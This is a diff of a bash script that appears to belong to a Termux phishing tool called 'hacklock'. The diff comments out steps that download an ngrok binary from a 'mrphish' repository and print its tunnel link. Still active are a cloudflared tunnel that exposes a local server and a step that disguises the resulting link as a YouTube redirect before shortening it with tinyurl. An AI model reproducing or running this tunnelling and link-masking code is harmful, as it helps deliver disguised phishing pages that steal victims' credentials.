@@ -188,10 +188,10 @@ echo " "
 else
 cd $HOME/hacklock
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
+##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
 sleep 20
 if [[ -e "$HOME/hacklock/ngrok" ]]; then
-chmod +x ngrok
+##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs chmod +x ngrok
 sleep 2.0
 printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok downloaded successfully.\n"
 else
@@ -226,10 +226,10 @@ termux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile $HOME/hacklock/cloudfl
 sleep 20
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
 flare=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' "$HOME/hacklock/cloudflare-log")
-printf "\e[1;92m[\e[0m*\e[1;92m] (NGROK) link:\e[0m\e[1;77m %s\e[0m\n" $link
+##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONsprintf "\e[1;92m[\e[0m*\e[1;92m] (NGROK) link:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;92m[\e[0m*\e[1;92m] (Cloud Flare) link:\e[0m\e[1;77m %s\e[0m\n" $flare
-ngrok_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Ngrok Short:\e[0m\e[1;77m %s \n' $ngrok_ip
+##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs ngrok_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Ngrok Short:\e[0m\e[1;77m %s \n' $ngrok_ip
 cloud_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$flare" | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cloud Short:\e[0m\e[1;77m %s \n' $cloud_ip
 printf "\n"
